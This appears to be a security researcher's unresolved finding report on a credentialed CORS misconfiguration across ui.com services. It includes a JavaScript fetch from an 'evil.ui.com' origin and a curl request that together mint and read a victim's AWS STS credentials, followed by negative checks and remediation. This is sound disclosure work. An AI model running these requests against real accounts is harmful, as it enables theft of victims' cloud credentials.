# Candidate (UNRESOLVED) — Credentialed CORS trusts any `*.ui.com` origin

**Status:** Confirmed misconfiguration; exploitation impact Unresolved (no attacker-controlled `*.ui.com` origin found).
**Severity if exploitable:** High (victim AWS STS credential theft via `cloudaccess.svc.ui.com`).
**Hosts:** `https://sso.ui.com`, `https://cloudaccess.svc.ui.com`
**Date:** 2026-11-10 (initial); 2026-11-12 (AWS STS impact demonstrated)

## Summary
`sso.ui.com` and `cloudaccess.svc.ui.com` reflect the request `Origin` in
`Access-Control-Allow-Origin` together with `Access-Control-Allow-Credentials: true`
whenever the origin's hostname ends in `.ui.com`. Any page with JavaScript execution on
any `*.ui.com` subdomain can therefore make credentialed cross-origin reads of the
victim's authenticated API responses (profile, sessions, MFA list, addresses, activity)
and, on `cloudaccess.svc.ui.com`, can call `POST /create-credentials` to mint the
victim's **AWS STS credentials** (`accessKeyId`, `secretKey`, `sessionToken`).

The missing exploitation primitive is an attacker-controlled `*.ui.com` origin (user
content, uploaded HTML/JS, third-party app on a `ui.com` host, or subdomain takeover).
Wildcard `*.ui.com` serves a fixed SPA and no controllable origin was found, so this
remains a trust-boundary finding rather than a standalone confirmed exploit.

## Reproduction — AWS STS credential theft (Session 7)
1. Log in as the victim on `account.ui.com` (cookie `UBIC_AUTH` is scoped to `.ui.com`,
   so it is sent to every `*.ui.com` host).
2. From any `*.ui.com` origin, run a credentialed cross-origin POST. Verified in the
   headless browser on `https://evil.ui.com` (an arbitrary `*.ui.com` subdomain that
   resolves to the same Site Manager SPA):

```js
// executed on https://evil.ui.com
const r = await fetch('https://cloudaccess.svc.ui.com/create-credentials', {
  method: 'POST',
  credentials: 'include',
  headers: {'content-type': 'application/json'},
  body: '{}'
});
await r.text();
```

Observed: `HTTP 200`, CORS check passed, body readable:
```json
{"identityId":"us-west-2:454b5792-f574-c8c1-27e1-86db38842c0d",
 "accessKeyId":"ASIA...","secretKey":"...","sessionToken":"IQoJb3JpZ2luX2VjE..."}
```
The `create-credentials` response is the victim's AWS STS credential set (region
`us-west-2`). This is a concrete, high-impact capability if an attacker can run JS on any
`*.ui.com` origin.

## Reproduction — CORS reflection (curl)
```
curl -sSi https://cloudaccess.svc.ui.com/create-credentials \
  -X POST -H 'content-length: 0' \
  -H 'Origin: https://evil.ui.com' \
  -H "Cookie: UBIC_AUTH=<redacted>"
```
Response includes:
```
access-control-allow-origin: https://evil.ui.com
access-control-allow-credentials: true
```
Same on `https://sso.ui.com/api/sso/v1/user/self` (preflight allows
`PUT, POST, PATCH, DELETE` with `content-type`, `max-age=600`).

## Negative checks
- `Origin: https://evil.com`, `https://evilui.com`, `https://ui.com.evil.com`,
  `https://account.ui.com.evil.com`, `http://evil.ui.com`, `null` -> **no ACAO**
  (only https origins whose hostname ends in `.ui.com` are reflected).
- `account.svc.ui.com` is stricter: only `https://account.ui.com` is reflected; all
  other origins get `403` with no ACAO.
- `create-credentials` ignores body/header identity selection:
  `{"identityId":"...0000"}`, `{"role":"ADMIN"}`, `{"orgId":"..."}`,
  `X-Identity-Id: ...` all still return the session user's fixed `identityId`
  (`us-west-2:454b5792-...`). No identity/role injection.
- `cloudaccess.svc.ui.com` write/read endpoints are otherwise empty for the test account
  (no hosts/sites/invitations), so no cross-tenant data was observed.

## Related observations (out of scope, not tested further)
- `enterprise.svc.ui.com` also reflects `https://evil.ui.com` with
  `Access-Control-Allow-Credentials: true` and returns `200` (`/api/v2/organizations`).
- `fabric.svc.ui.com` emits the reflected ACAO/ACAC headers on `403` responses.
- Both are listed in `result/out-of-scope.txt`; only CORS headers were observed.

## Why not confirmed
Exploitation requires the attacker to control content on a `*.ui.com` origin. Wildcard
DNS `*.ui.com` points to AWS CloudFront and serves a fixed SPA; no writable bucket,
Host-header reflection, uploaded HTML/JS, or subdomain takeover was found. Without that
foothold the reflected CORS grants no capability beyond the victim's own origin.
Additionally, credential-theft/CORS is not one of the classes the project records in
`confirmed-vuln.txt` (XSS/CSTI/IDOR/BAC/open redirect), so it is documented here and
kept Unresolved.

## Remediation
Replace suffix matching with an explicit allowlist of trusted first-party origins
(`https://account.ui.com`, `https://unifi.ui.com`, ...) and do not enable
`Access-Control-Allow-Credentials` for wildcard subdomains. Require a non-cookie
(e.g., CSRF token or Authorization header) for `create-credentials`.
